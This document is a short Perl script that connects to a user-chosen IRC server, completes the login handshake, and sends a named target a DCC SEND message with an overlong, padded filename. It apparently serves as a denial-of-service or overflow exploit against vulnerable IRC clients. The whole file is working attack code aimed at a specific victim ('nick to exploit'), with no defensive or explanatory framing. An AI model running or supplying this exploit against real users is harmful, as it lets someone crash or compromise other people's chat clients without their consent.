#!/usr/bin/perl -w
use IO::Socket;
# get irc server to connect to, and nick to exploit.
print "Enter Serv: "; chomp($serv=<STDIN>);
print "Enter Nick: "; chomp($nick=<STDIN>);

#setup connection
$ocket = IO::Socket::INET->new(
                        PeerAddr=>"$serv",
			PeerPort=>'6667'
			) || die "could not connect to $serv: $!";

#$| = 1;
#$ocket->autoflush();
$line="";
until($line =~ /Ident/){
	$oldline=$line;
	$line = <$ocket>;
	if($oldline ne $line) {print $line;}
}

print $ocket "user ident irc name ircname\n";  #send ident/ircname info

$line="";
until($line =~/PING/){
	$oldline=$line;
	$line = <$ocket>;
	if ($oldline ne $line) {print $line;}
}


$line =~ s/.*://;
print $ocket "PONG :$line\n";
print $ocket "nick thssmnck\n";
print $ocket "privmsg $nick :DCC SEND \"a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a \" 1079095848 666\n";

